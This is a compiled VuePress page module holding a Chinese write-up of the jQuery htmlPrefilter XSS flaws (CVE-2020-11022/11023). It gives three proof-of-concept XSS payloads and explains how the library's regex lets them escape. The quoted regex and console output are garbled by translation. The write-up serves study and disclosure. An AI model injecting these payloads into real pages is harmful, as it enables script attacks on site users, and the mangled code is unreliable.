import{_ as l}from"./plugin-vue_export-helper-c27b6911.js";import{r,o,c as i,a as e,b as a,d as t,e as n}from"./app-58e4a7d6.js";const p={},c=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>据 NVD 描述：在大于或等于 1.2 且在 3.5.0 之前的 jQuery 版本中，即使执行了消毒（sanitize）处理，也仍会执行将来自不受信任来源的 HTML 传递给 jQuery 的 DOM 操作方法（即 html()、.append() 等），从而导致 xss 漏洞。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>3.5.0 &gt; jQuery &gt;= 1.2
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>在线复现地址， 可以通过观察变化了解漏洞</p>`,6),d={href:"https://vulnerabledoma.in/jquery_htmlPrefilter_xss.html",target:"_blank",rel:"noopener noreferrer"},u=n(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code>PoC <span class="token number">1.</span>
<span class="token operator">&lt;</span>style<span class="token operator">&gt;</span><span class="token operator">&lt;</span>style <span class="token operator">/</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>x onerror<span class="token operator">=</span>alert<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&gt;</span> 

PoC <span class="token number">2.</span> <span class="token punctuation">(</span>Only jQuery <span class="token number">3</span><span class="token punctuation">.</span>x affected<span class="token punctuation">)</span>
<span class="token operator">&lt;</span>img alt<span class="token operator">=</span><span class="token string">&quot;&lt;x&quot;</span> title<span class="token operator">=</span><span class="token string">&quot;/&gt;&lt;img src=x onerror=alert(1)&gt;&quot;</span><span class="token operator">&gt;</span>

PoC <span class="token number">3.</span>
<span class="token operator">&lt;</span>option<span class="token operator">&gt;</span><span class="token operator">&lt;</span>style<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>option<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>select<span class="token operator">&gt;</span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>x onerror<span class="token operator">=</span>alert<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>style<span class="token operator">&gt;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091311659.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,2),m=e("code",null,".html()",-1),g={href:"https://api.jquery.com/jQuery.htmlPrefilter/",target:"_blank",rel:"noopener noreferrer"},v=e("code",null,"htmlPrefilter",-1),h=e("code",null,"<tagname **/>**``<tagname ></tagname>",-1),k=n(`<div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>rxhtmlTag = / &lt;（?! area | br | col | embed | hr | img | input | link | meta | param）（（[[ww：-] +）[^&gt;] *）\\ /&gt; / gi
[。 ..]
htmlPrefilter：function（html）{
  return html.replace（rxhtmlTag，“ &lt;$ 1&gt; &lt;/ $ 2&gt;”）;
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>如果 PoC 1 的 HTML 通过此替换，则输出将是：</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>&gt; $ .htmlPrefilter（&#39;&lt;style&gt; &lt;style /&gt; &lt;img src = x onerror = alert（1）&gt;&#39;）
&lt;“ &lt;style&gt; &lt;style&gt; &lt;/ style&gt; &lt;img src = x onerror = alert（1） &gt;“
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>黄色部分是替换的字符串。由于此替换，<code>&lt;style /&gt;</code> 样式元素内部被替换 <code>&lt;style &gt;&lt;/style&gt;</code> 为，结果是，之后的字符串从样式元素中被踢出。之后，<code>.html()</code> 将替换的 HTML 分配给 <code>innerHTML</code>。在这里，<code>&lt;img ...&gt;</code> 字符串变成了实际的 img 标签，并触发了 onerror 事件。</p><p>顺便说一下，上述正则表达式在 3.x 之前的 jQuery 中使用。从 3.x 开始，使用了另一个经过稍加修改的正则表达式</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>rxhtmlTag = / &lt;（?! area | br | col | embed | hr | img | input | link | meta | param）（（[[az] [^ \\ / \\ 0&gt; \\ x20 \\ t \\ r \\ n \\ f] *）[^&gt;] *）\\ /&gt; / gi
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>此更改引入了另一个 XSS 向量，该向量可能仅由更多基本元素和属性导致 XSS。通过此更改引入了 PoC 2 的向量。它仅适用于 jQuery3.x。</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>&gt; $ .htmlPrefilter（&#39;&lt;img alt =“ &lt;x” title =“ /&gt; &lt;img src = x onerror = alert（1）&gt;”&gt;&#39;）
&lt;“ &lt;img alt =” &lt;x“ title =”&gt; &lt; / x“&gt; &lt;img src = x onerror = alert（1）&gt;”&gt;“
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>在这种情况下，属性值上的 img 字符串被踢出并发生 XSS。</p>`,9);function b(x,_){const s=r("ExternalLinkIcon");return o(),i("div",null,[c,e("p",null,[e("a",d,[a("https://vulnerabledoma.in/jquery_htmlPrefilter_xss.html"),t(s)])]),u,e("p",null,[a("PoC 1 和 PoC 2 具有相同的根本原因。在中 "),m,a("，作为参数传递的 HTML 字符串将传递到 "),e("a",g,[a("$ .htmlPrefilter（）"),t(s)]),a(" 方法。该 "),v,a(" 处理用于替换自闭合标签等进行到，通过使用以下正则表达式："),h]),k])}const P=l(p,[["render",b],["__file","jQuery XSS漏洞 CVE-2020-11022 11023.html.vue"]]);export{P as default};
